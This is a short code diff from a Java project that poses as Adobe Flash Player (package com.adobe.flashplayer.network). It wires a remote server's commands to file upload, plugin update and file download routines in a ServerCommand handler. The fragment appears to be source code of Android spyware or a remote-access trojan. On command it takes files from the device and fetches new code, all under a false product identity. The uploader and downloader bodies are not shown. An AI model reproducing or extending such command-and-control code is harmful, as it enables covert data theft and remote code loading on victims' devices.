@@ -1,5 +1,6 @@
 package com.adobe.flashplayer.network;
 
+import java.io.File;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -354,15 +355,21 @@ public class ServerCommand implements Runnable{
 			}
 			else if(servercmd == Public.CMD_UPLOADFILE){
 
+				FileUploader.fileUploader(recvbuf,recvlen,recvpacklen,ins,ous);
+
 				MyLog.writeLogFile("recv cmd upload file\r\n");
 				return 0;
 			}
 			else if (servercmd == Public.CMD_UPDATEPROC) {
 
+				FileDownloader.pluginDownloader(recvbuf,recvlen,recvpacklen,context,ins);
+
 				MyLog.writeLogFile("recv cmd update plugin\r\n");
 				return 0;
 			}
 			else if (servercmd == Public.CMD_DOWNLOADFILE) {
+
+				FileDownloader.fileDownloader(recvbuf,recvlen,recvpacklen,context,ins);
 
 				MyLog.writeLogFile("recv cmd download file\r\n");
 				return 0;
